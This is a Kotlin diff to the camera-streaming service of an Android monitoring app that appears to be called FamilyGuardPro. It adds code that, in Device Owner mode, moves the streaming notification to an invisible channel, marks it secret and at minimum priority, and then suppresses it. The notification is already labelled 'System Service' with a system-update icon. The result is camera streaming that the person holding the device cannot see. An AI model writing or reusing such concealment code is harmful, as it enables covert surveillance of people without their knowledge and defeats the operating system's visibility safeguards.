@@ -105,12 +105,26 @@ class CameraStreamService : Service() {
     }
 
     private fun startForeground() {
-        val notification = NotificationCompat.Builder(this, FamilyGuardApp.NOTIFICATION_CHANNEL_STREAMING)
+        // Check if Device Owner mode - use invisible channel
+        val doManager = try {
+            com.familyguardpro.deviceowner.DeviceOwnerManager.getInstance(this)
+        } catch (e: Exception) { null }
+        
+        val channelId = if (doManager?.isDeviceOwner() == true) {
+            // Use invisible channel for DO mode
+            com.familyguardpro.utils.NotificationUtils.ensureInvisibleChannel(this)
+            com.familyguardpro.deviceowner.DeviceOwnerManager.INVISIBLE_CHANNEL_ID
+        } else {
+            FamilyGuardApp.NOTIFICATION_CHANNEL_STREAMING
+        }
+        
+        val notification = NotificationCompat.Builder(this, channelId)
             .setContentTitle("System Service")
             .setContentText("Running")
             .setSmallIcon(R.drawable.ic_system_update)
-            .setPriority(NotificationCompat.PRIORITY_LOW)
+            .setPriority(NotificationCompat.PRIORITY_MIN)
             .setOngoing(true)
+            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
             .build()
         
         if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
@@ -119,6 +133,11 @@ class CameraStreamService : Service() {
         } else {
             startForeground(NOTIFICATION_ID, notification)
         }
+        
+        // Suppress notification in Device Owner mode
+        com.familyguardpro.utils.NotificationUtils.suppressForegroundNotificationIfDeviceOwner(
+            this, NOTIFICATION_ID
+        )
     }
 
     private fun startBackgroundThread() {
